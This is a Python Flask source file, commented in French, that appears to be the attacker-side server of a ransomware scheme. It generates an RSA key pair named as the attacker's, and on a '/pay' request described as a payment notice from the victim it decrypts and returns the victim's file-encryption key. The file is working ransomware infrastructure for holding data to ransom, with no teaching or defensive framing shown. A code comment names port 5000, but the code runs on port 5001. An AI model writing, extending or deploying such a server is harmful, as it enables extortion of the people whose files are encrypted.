#!/usr/bin/env python3
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import os

app = Flask(__name__)

PRIVATE_KEY_FILE = "attacker_private.pem"
PUBLIC_KEY_FILE = "attacker_public.pem"
SYMMETRIC_KEY_ENC_FILE = "symmetric_key.enc"

def load_private_key():
    with open(PRIVATE_KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
        )
    return private_key

@app.route('/pay', methods=['POST'])
def pay():
    # Réception de la notification de paiement
    print("Notification de paiement reçue de la victime.")
    if not os.path.exists(SYMMETRIC_KEY_ENC_FILE):
        return jsonify({"error": "Clé symétrique non trouvée"}), 400
    with open(SYMMETRIC_KEY_ENC_FILE, "rb") as f:
        encrypted_symmetric_key = f.read()
    try:
        private_key = load_private_key()
        symmetric_key = private_key.decrypt(
            encrypted_symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print("Clé symétrique décryptée et envoyée à la victime.")
        # Renvoi de la clé symétrique sous forme de chaîne
        return jsonify({"symmetric_key": symmetric_key.decode()}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    # Si les clés RSA n'existent pas, on les génère
    if not os.path.exists(PRIVATE_KEY_FILE) or not os.path.exists(PUBLIC_KEY_FILE):
        from cryptography.hazmat.primitives.asymmetric import rsa
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pem_private = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        pem_public = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        with open(PRIVATE_KEY_FILE, "wb") as f:
            f.write(pem_private)
        with open(PUBLIC_KEY_FILE, "wb") as f:
            f.write(pem_public)
        print("Clés RSA générées et sauvegardées.")
    # Lancement du serveur Flask sur le port 5000
    app.run(host="0.0.0.0", port=5001)
